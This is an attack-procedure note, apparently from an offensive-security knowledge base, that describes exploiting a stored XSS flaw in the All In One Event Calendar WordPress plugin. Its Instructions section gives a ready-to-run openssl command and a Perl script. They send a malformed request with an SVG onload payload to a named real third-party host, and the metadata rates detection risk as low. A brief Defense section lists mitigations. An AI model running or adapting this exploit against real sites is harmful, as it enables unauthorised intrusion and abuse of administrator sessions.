---
id: proc-inject-xss-http
tags:
  - xss
  - injection
  - wordpress
type: procedure
tools:
  - '[[tools/Perl]]'
  - '[[tools/OpenSSL]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/perl-inject-xss-http-request]]'
  - '[[commands/openssl-connect-https]]'
verified: false
platforms:
  - Web
  - WordPress
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:28:58.979Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Inject-XSS-Payload-via-Malformed-HTTP-Request

## Summary

This procedure exploits a lack of input sanitization in the All In One Event Calendar plugin by sending a malformed HTTP request to the /oh/ endpoint, triggering an SQL format string error that embeds an unfiltered XSS payload into the admin dashboard's error banner for later execution.

## Description

The All In One Event Calendar plugin processes the events_per_page parameter in SQL queries without proper validation. By crafting a GET request with a malformed value like "$%&xss=<svg/onload=alert(/stored-xss/.source)>", an invalid format string error occurs, and the error message includes the raw user input without HTML escaping. This stores the payload in the dashboard, visible only to admins upon login. Prerequisites include network access to the target WordPress site and the plugin being enabled. Expected outcome is a stored XSS ready for execution, potentially leading to admin privilege abuse.

## Requirements

1. Network connectivity to target domain on port 443 (HTTPS)
2. All In One Event Calendar plugin active on WordPress
3. Perl and OpenSSL installed on attacking machine
4. No authentication for injection endpoint

## Defense

Defensive measures and detection strategies:

- Sanitize and escape all user inputs in SQL queries and error messages
- Disable or update the All In One Event Calendar plugin to a patched version
- Monitor for anomalous HTTP requests to plugin endpoints with special characters
- Implement Content Security Policy (CSP) to restrict inline JavaScript execution

## Objectives

1. Trigger SQL error to store unescaped XSS payload in admin error banner
2. Avoid browser encoding to preserve payload integrity
3. Prepare for admin-context JavaScript execution

## Instructions

### Step 1: Establish HTTPS Connection

**Context**: Use OpenSSL to create a quiet HTTPS connection without automatic encoding, allowing raw request transmission.

**Command** ([[commands/openssl-connect-https]]):
```bash
openssl s_client -connect drive.uber.com:443 -quiet
```

> This opens a socket for piping the HTTP request. Expected output is an open connection ready for input; no verbose handshake details due to -quiet flag.

### Step 2: Send Malformed GET Request

**Context**: Pipe the crafted Perl script to send the GET request with malformed events_per_page, injecting the SVG-based XSS payload that triggers on load.

**Command** ([[commands/perl-inject-xss-http-request]]):
```perl
#!/usr/bin/perl
open(NC,"|openssl s_client -connect drive.uber.com:443 -quiet") || die;
print NC "GET /oh/?ai1ec_js_widget=ai1ec_agenda_widget&render=true&events_per_page=$%&xss=<svg/onload=alert(/stored-xss/.source)>\r\n";
print NC "HTTP/1.1\r\n";
print NC "Host: drive.uber.com\r\n";
print NC "\r\n";
close(NC);
```

> The script simulates a raw browser request, causing the plugin to error and store the payload. Expected output: HTTP 302 redirect to front page, confirming error trigger without payload execution.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/perl-inject-xss-http-request]]
- [[commands/openssl-connect-https]]

## Tools Used

- [[tools/Perl]]
- [[tools/OpenSSL]]

## Tags

- xss
- injection
- wordpress
